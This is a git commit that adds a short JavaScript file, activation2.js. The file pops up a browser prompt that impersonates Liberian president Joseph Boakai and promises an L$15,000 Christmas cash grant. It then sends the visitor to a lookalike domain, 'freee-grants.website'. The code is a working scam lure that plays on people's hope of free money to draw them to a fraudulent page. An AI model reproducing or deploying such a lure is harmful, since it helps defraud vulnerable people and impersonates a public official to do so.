4471958018fedaacbcb44f9875225c75341d38e9
mas-gift <harisuhamza310@gmail.com>
2025-12-07 12:48:02 +0100

    Create activation2.js

---
+++ activation2.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('🎉 Joseph Boakai: Congratulations, you are eligible to receive the L$ 15,000 Christmas & End Of Year Cash Grant Transfer, Kindly press OK to submit your information and receive L$ 15,000 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://freee-grants.website/Joseph-Boakai-Free-Cash-Grant.html';
+}
